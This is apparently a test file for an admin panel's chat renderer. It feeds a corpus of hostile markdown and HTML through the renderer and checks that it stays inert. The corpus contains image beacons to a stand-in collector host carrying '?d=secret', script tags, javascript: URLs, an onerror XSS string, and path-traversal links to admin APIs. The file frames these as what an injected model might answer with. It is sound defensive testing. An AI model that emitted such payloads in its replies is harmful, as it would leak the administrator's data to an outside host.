/**
 * M4 — a model's reply as the admin draws it (design §8.3, non-negotiable;
 * §12.1 tests/ai-render): a hostile corpus through ChatMarkdown with
 * react-dom/server. No `img`, no live `href` outside the allow-list,
 * `/api/`, `/oauth/` and `/ai/review/` inert, references inert, raw HTML as
 * literal text, never dangerouslySetInnerHTML. ChatMarkdown is .tsx: a
 * test-local loader transpiles it with the project's TypeScript (as
 * tests/ai-change-card does). The browser half (no network request from a
 * hostile reply) is e2e/ai-assistant.spec.ts.
 */
import { register } from 'node:module'
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { externalUrl, liveHref } from '../components/Admin/ai/chatLinks'

register(
  'data:text/javascript,' +
    encodeURIComponent(`
      import { readFileSync } from 'node:fs'
      import { fileURLToPath } from 'node:url'
      import { createRequire } from 'node:module'
      const require = createRequire(${JSON.stringify(new URL('../package.json', import.meta.url).href)})
      const ts = require('typescript')
      export async function load(url, context, next) {
        if (url.startsWith('file:') && url.endsWith('.tsx') && !url.includes('/node_modules/')) {
          const source = readFileSync(fileURLToPath(url), 'utf8')
          const out = ts.transpileModule(source, {
            fileName: fileURLToPath(url),
            compilerOptions: { jsx: ts.JsxEmit.ReactJSX, module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022, esModuleInterop: true },
          })
          return { format: 'module', source: out.outputText, shortCircuit: true }
        }
        return next(url, context)
      }
    `),
  import.meta.url,
)

const ROOT = path.resolve(import.meta.dirname, '..')
const COLLECTOR = 'https://collector.example'

/** Every live address a page could follow or load from: href, src, srcset, poster, data, action, formaction, background, xlink:href. */
function addresses(html: string): string[] {
  return Array.from(html.matchAll(/\s(href|src|srcset|poster|data|action|formaction|background|xlink:href|ping)="([^"]*)"/gi), (m) => `${m[1]}=${m[2]}`)
}

async function render(text: string): Promise<string> {
  const { ChakraProvider } = await import('@chakra-ui/react')
  const { default: theme } = await import('../theme/chakra.js')
  const { default: ChatMarkdown } = await import('../components/Admin/ai/ChatMarkdown')
  const raw = renderToStaticMarkup(createElement(ChakraProvider, { theme }, createElement(ChatMarkdown, { text })))
  // Emotion writes its style tags next to the elements on the server: the markup is what is left.
  return raw.replace(/<style[^>]*>[\s\S]*?<\/style>/g, '')
}

/** The hostile corpus: what an injected or hijacked model might answer with to make the browser send something. */
const HOSTILE = [
  `![pixel](${COLLECTOR}/inline.png?d=secret)`,
  `![pixel](${COLLECTOR}/titled.png "title")`,
  `![ref][1]\n\n[1]: ${COLLECTOR}/ref.png`,
  `![collapsed][]\n\n[collapsed]: ${COLLECTOR}/collapsed.png`,
  `![shortcut]\n\n[shortcut]: ${COLLECTOR}/shortcut.png`,
  `[a link][1] and [another][]\n\n[1]: ${COLLECTOR}/link\n[another]: /api/admin/draft`,
  `<img src="${COLLECTOR}/raw.png"> <img srcset="${COLLECTOR}/a.png 1x"> <video poster="${COLLECTOR}/p.png"></video>`,
  `<script>window.__owned = true</script><style>body{background:url(${COLLECTOR}/bg.png)}</style>`,
  `<a href="/api/admin/export">export</a> <iframe src="${COLLECTOR}/f"></iframe> <object data="${COLLECTOR}/o"></object>`,
  `<form action="/api/admin/draft"><button formaction="/api/admin/orcid/connect">go</button></form>`,
  `<svg><image href="${COLLECTOR}/svg.png"/><a xlink:href="/api/admin/draft">x</a></svg>`,
  '[draft](/api/admin/draft) [orcid](/api/admin/orcid/connect) [export](/api/admin/export?all=1) [mcp](/mcp)',
  '[review](/ai/review/ch_abcdefghijklmnop) [authorize](/oauth/authorize?client_id=x) [well-known](/.well-known/oauth-authorization-server)',
  '[traversal](/blog/../api/admin/draft) [encoded](/blog/%2e%2e/api/admin/draft) [slash](/blog/..%2fapi%2fadmin%2fdraft) [backslash](/blog/\\api)',
  '[protocol-relative](//collector.example/x) [js](javascript:alert(1)) [data](data:text/html,<b>x</b>) [vb](vbscript:x) [file](file:///etc/passwd)',
  `[external](${COLLECTOR}/?d=secret) <${COLLECTOR}/autolink> ${COLLECTOR}/bare-literal www.collector.example/www`,
  '[mail](mailto:owner@example.test) <owner@example.test>',
  `Footnote[^1].\n\n[^1]: ${COLLECTOR}/footnote`,
  '<a href="/blog/fine">raw link to an allowed page</a>',
  `| a | b |\n|---|---|\n| ![x](${COLLECTOR}/cell.png) | [c](/api/admin/draft) |`,
  `> quoted ![q](${COLLECTOR}/q.png)\n>> deeper [d](/api/admin/draft)`,
  `- [ ] task ![t](${COLLECTOR}/t.png)\n- [x] done`,
  '```html\n<img src="https://collector.example/code.png">\n```',
  '`<img src=x onerror=alert(1)>`',
  `<!-- <img src="${COLLECTOR}/comment.png"> -->`,
  `[![nested](${COLLECTOR}/nested.png)](/blog/fine)`,
].join('\n\n')

test('the hostile corpus: no image, no element that loads, no live address outside the allow-list, raw HTML as text', async () => {
  const html = await render(HOSTILE)
  for (const tag of ['img', 'script', 'style', 'iframe', 'object', 'embed', 'video', 'audio', 'source', 'svg', 'image', 'form', 'input', 'link', 'meta', 'base', 'picture']) {
    assert.doesNotMatch(html, new RegExp(`<${tag}[\\s>/]`, 'i'), `no <${tag}> element`)
  }
  // The only live addresses are the allow-listed same-site ones the corpus contains.
  assert.deepEqual(addresses(html), ['href=/blog/fine'], 'only /blog/fine is a live link')
  assert.doesNotMatch(html, /on[a-z]+="/i, 'no event handler attribute')
  // What the reader sees instead: the image's words and address, the source of raw HTML, the addresses in full.
  assert.match(html, /\[image not loaded\] https:\/\/collector\.example\/inline\.png\?d=secret/)
  assert.match(html, /\[image not loaded\] !\[ref\]\[1\]/, 'an image reference is its source, unresolved')
  assert.match(html, /&lt;img src=&quot;https:\/\/collector\.example\/raw\.png&quot;&gt;/, 'raw HTML is literal text')
  assert.match(html, /&lt;script&gt;window\.__owned = true&lt;\/script&gt;/)
  assert.match(html, /\[a link\]\[1\]/, 'a link reference is its source, unresolved')
  assert.match(html, /\[1\]: https:\/\/collector\.example\/ref\.png/, 'a definition is its source')
  assert.match(html, /data-inert-url=""[^>]*>[\s\S]*?https:\/\/collector\.example\/\?d=secret/, 'an external address is shown in full, as text')
  assert.match(html, /\[draft\]\(\/api\/admin\/draft\)/, 'a link to /api/ is its source text')
  assert.match(html, /\[review\]\(\/ai\/review\/ch_abcdefghijklmnop\)/)
  assert.match(html, /\[authorize\]\(\/oauth\/authorize\?client_id=x\)/)
  assert.match(html, /\[js\]\(javascript:alert\(1\)\)/)
  assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/, 'inline code stays code')
})

test('the allow-list: public pages, change pages and editors are live; /api/, /oauth/, /ai/review/ and anything that normalises elsewhere are not', () => {
  const live = {
    '/blog/field-notes': '/blog/field-notes',
    '/work/case-study/': '/work/case-study/',
    '/now': '/now',
    '/uses': '/uses',
    '/about': '/about',
    '/zh': '/zh',
    '/zh/blog': '/zh/blog',
    '/cv': '/cv',
    '/cv/zh': '/cv/zh',
    '/publications': '/publications',
    '/admin/ai/change/ch_abcdefghijklmnop': '/admin/ai/change/ch_abcdefghijklmnop',
    '/admin/blog/edit?slug=field-notes': '/admin/blog/edit?slug=field-notes',
    '/admin/work/edit?slug=x#body': '/admin/work/edit?slug=x#body',
    '/admin/now': '/admin/now',
    '/admin/uses': '/admin/uses',
    '/admin/about': '/admin/about',
    '/admin/home': '/admin/home',
    '/admin/dashboard': '/admin/dashboard',
    '/admin/media': '/admin/media',
  }
  for (const [raw, out] of Object.entries(live)) assert.equal(liveHref(raw), out, raw)
  const inert = [
    '/api/admin/draft',
    '/API/admin/draft',
    '/api',
    '/oauth/authorize',
    '/ai/review/ch_abcdefghijklmnop',
    '/.well-known/oauth-authorization-server',
    '/mcp',
    '/admin/ai/change/ch_ABC',
    '/admin/ai/change/ch_abcdefghijklmnop/approve',
    '/admin/security',
    '/admin/system',
    '/admin/ai',
    '/admin/ai/connect?client_id=x',
    '/review/token',
    '/cv/r/token',
    '/blog',
    '/blog/a/b',
    '/blog/../api/admin/draft',
    '/blog/%2e%2e/api/admin/draft',
    '/blog/..%2fapi',
    '/blog/%5capi',
    '/blog/x%00',
    '/blog/\\api',
    '/blog/ x',
    '/blog/x\n',
    '//collector.example/blog/x',
    'blog/x',
    'https://collector.example/blog/x',
    'javascript:alert(1)',
    '',
    `/blog/${'a'.repeat(400)}`,
  ]
  for (const raw of inert) assert.equal(liveHref(raw), null, JSON.stringify(raw))
  assert.equal(liveHref(undefined), null)
  assert.equal(externalUrl('https://example.com/x?y=1'), 'https://example.com/x?y=1')
  assert.equal(externalUrl('http://example.com'), 'http://example.com')
  for (const raw of ['javascript:alert(1)', 'data:text/html,x', '/blog/x', 'mailto:owner@example.test', 'not a url']) assert.equal(externalUrl(raw), null, raw)
})

test('ordinary Markdown draws as the allow-list says: paragraphs, lists, emphasis, code, headings under the page’s outline, quotes, tables', async () => {
  const html = await render(['# Title', '', 'Some *emphasis*, **strong**, ~~gone~~ and `code`.', '', '1. one', '2. two', '', '- a', '- b', '', '> quote', '', '```ts', 'const x = 1', '```', '', '---', '', '| h1 | h2 |', '|:--|--:|', '| c1 | c2 |', '', 'Line one  ', 'line two'].join('\n'))
  assert.match(html, /<h3[^>]*>Title<\/h3>/, 'a reply’s top heading sits under the conversation’s h2')
  assert.doesNotMatch(html, /<h1|<h2/)
  assert.match(html, /<em>emphasis<\/em>/)
  assert.match(html, /<strong>strong<\/strong>/)
  assert.match(html, /<del>gone<\/del>/)
  assert.match(html, /<code[^>]*>code<\/code>/)
  assert.match(html, /<ol[^>]*><li[^>]*><p[^>]*>one<\/p>|<ol[^>]*><li[^>]*>one/)
  assert.match(html, /<ul[^>]*>/)
  assert.match(html, /<blockquote[^>]*>/)
  assert.match(html, /<pre[^>]*><code>const x = 1<\/code><\/pre>/)
  assert.match(html, /<hr/)
  assert.match(html, /<th[^>]*scope="col"[^>]*>h1<\/th>/)
  assert.match(html, /<td[^>]*>c2<\/td>/)
  assert.match(html, /Line one<br\/>/)
})

test('a reply in Chinese keeps its text; a very long or very deep reply falls back to text instead of stalling the page', async () => {
  const zh = await render('**草稿**已保存，访客看不到。见 [文章](/blog/field-notes)。')
  assert.match(zh, /<strong>草稿<\/strong>已保存，访客看不到。/)
  assert.deepEqual(addresses(zh), ['href=/blog/field-notes'])
  const { CHAT_MD_MAX } = await import('../components/Admin/ai/ChatMarkdown')
  const long = `![x](${COLLECTOR}/long.png) ` + 'a'.repeat(CHAT_MD_MAX)
  const longHtml = await render(long)
  assert.doesNotMatch(longHtml, /<img/)
  assert.match(longHtml, /!\[x\]\(https:\/\/collector\.example\/long\.png\)/, 'shown as plain text, unparsed')
  const deep = `${'> '.repeat(200)}[d](/api/admin/draft) ![x](${COLLECTOR}/deep.png)`
  const started = Date.now()
  const deepHtml = await render(deep)
  assert.ok(Date.now() - started < 5000, 'a deep reply renders promptly')
  assert.doesNotMatch(deepHtml, /<img/)
  assert.deepEqual(addresses(deepHtml), [])
})

test('ChatMarkdown never uses dangerouslySetInnerHTML, never draws an image, and is the one place a reply becomes markup', () => {
  const src = fs.readFileSync(path.join(ROOT, 'components/Admin/ai/ChatMarkdown.tsx'), 'utf8')
  assert.doesNotMatch(src, /dangerouslySetInnerHTML/)
  assert.doesNotMatch(src, /<img|as="img"|<Image\b/)
  assert.doesNotMatch(src, /rehype|hast-util-to-jsx-runtime|remark-rehype/, 'no route through HTML: the tree is mapped by hand')
  // Every component under components/Admin/ai that shows model text uses ChatMarkdown or plain text.
  for (const f of fs.readdirSync(path.join(ROOT, 'components/Admin/ai'))) {
    const s = fs.readFileSync(path.join(ROOT, 'components/Admin/ai', f), 'utf8')
    assert.doesNotMatch(s, /dangerouslySetInnerHTML/, f)
  }
})
